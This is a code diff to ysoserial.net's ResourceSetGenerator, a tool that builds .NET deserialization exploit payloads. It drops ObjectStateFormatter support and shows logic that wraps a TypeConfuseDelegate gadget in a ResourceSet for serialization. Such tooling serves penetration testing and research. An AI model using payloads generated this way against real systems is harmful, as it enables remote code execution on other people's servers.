@@ -17,7 +17,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "LosFormatter" };
+            return new List<string> { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
         public override string Name()
@@ -45,20 +45,19 @@ namespace ysoserial.Generators
             // object generatedPayload = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(tempInputArgs);
 
             object generatedPayload = TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(inputArgs);
-
+            
             using (ResourceWriter rw = new ResourceWriter(@".\ResourceSetGenerator.resources"))
             {
                 rw.AddResource("", generatedPayload);
                 rw.Generate();
                 rw.Close();
             }
-            
+
             // Payload will be executed once here which is annoying but without surgical insertion or something to parse binaryformatter objects, it is quite hard to prevent this
             ResourceSet myResourceSet = new ResourceSet(@".\ResourceSetGenerator.resources");
             
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
-                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("netdatacontractserializer", StringComparison.OrdinalIgnoreCase))
             {
                 return Serialize(myResourceSet, formatter, inputArgs);
